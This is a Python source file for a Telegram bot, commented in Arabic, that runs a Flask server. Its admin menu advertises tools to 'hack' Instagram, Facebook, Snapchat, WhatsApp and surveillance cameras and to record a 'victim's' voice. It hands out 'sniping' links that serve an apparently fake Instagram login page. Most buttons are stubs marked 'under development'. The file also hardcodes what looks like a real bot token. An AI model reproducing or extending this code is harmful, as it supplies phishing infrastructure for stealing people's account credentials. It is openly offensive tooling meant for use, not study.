import os
import telebot
from flask import Flask
from threading import Thread
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# --- 1. الإعدادات النهائية (الرابط الجديد + التوكن) ---
TOKEN = "8206948320:AAH-NQnab9n2m4BFWsbPE3HNdQuG_LKOVPY"
ADMIN_ID = 8276213504 
BASE_URL = "https://usa-elite-1.onrender.com"

bot = telebot.TeleBot(TOKEN)
app = Flask(__name__)

# --- 2. واجهة الويب (صفحة القنص) ---
@app.route('/')
def home():
    return "<h1>USA-ELITE SYSTEM IS ACTIVE 🚀</h1>"

@app.route('/insta')
def insta_trap():
    try:
        with open('index.html', 'r', encoding='utf-8') as f:
            return f.read()
    except Exception as e:
        return f"<h2>Error: index.html not found! {str(e)}</h2>"

# --- 3. لوحة التحكم الاحترافية بالأزرار ---
def main_menu():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.add(InlineKeyboardButton("📸 اختراق انستغرام", callback_data="link_insta"),
               InlineKeyboardButton("📱 جمع معلومات الجهاز", callback_data="hack"))
    markup.add(InlineKeyboardButton("👻 اختراق سناب شات", callback_data="hack"),
               InlineKeyboardButton("🎙️ تسجيل صوت الضحية", callback_data="hack"))
    markup.add(InlineKeyboardButton("📘 اختراق فيسبوك", callback_data="link_fb"),
               InlineKeyboardButton("📡 اختراق كاميرا المراقبة", callback_data="hack"))
    markup.add(InlineKeyboardButton("⚠️ تلغيم رابط", callback_data="hack"),
               InlineKeyboardButton("🟢 اختراق واتساب", callback_data="hack"))
    markup.add(InlineKeyboardButton("🤖 الذكاء الاصطناعي", callback_data="ai"),
               InlineKeyboardButton("📧 إنشاء إيميل وهمي", callback_data="hack"))
    return markup

# --- 4. معالجة الأوامر والروابط ---
@bot.message_handler(commands=['start'])
def welcome(message):
    if message.from_user.id == ADMIN_ID:
        bot.send_message(message.chat.id, f"👑 أهلاً يا قائد!\nنظام USA-ELITE تحت أمرك.\n\nرابطك الحالي: {BASE_URL}\n\nاختر الأداة المطلوبة:", reply_markup=main_menu())

@bot.callback_query_handler(func=lambda call: True)
def handle_query(call):
    if call.data == "link_insta":
        bot.send_message(call.message.chat.id, f"🎯 رابط قنص انستغرام جاهز:\n`{BASE_URL}/insta`", parse_mode="Markdown")
    elif call.data == "link_fb":
        bot.send_message(call.message.chat.id, f"🎯 رابط قنص فيسبوك جاهز:\n`{BASE_URL}/fb`", parse_mode="Markdown")
    else:
        bot.answer_callback_query(call.id, "🛠️ قيد التطوير...")

# --- 5. محرك التشغيل السحابي ---
def run_web():
    port = int(os.environ.get("PORT", 8080))
    app.run(host="0.0.0.0", port=port)

if __name__ == "__main__":
    t = Thread(target=run_web)
    t.daemon = True
    t.start()
    bot.remove_webhook()
    print("🚀 USA-ELITE IS LIVE!")
    bot.infinity_polling(skip_pending=True)

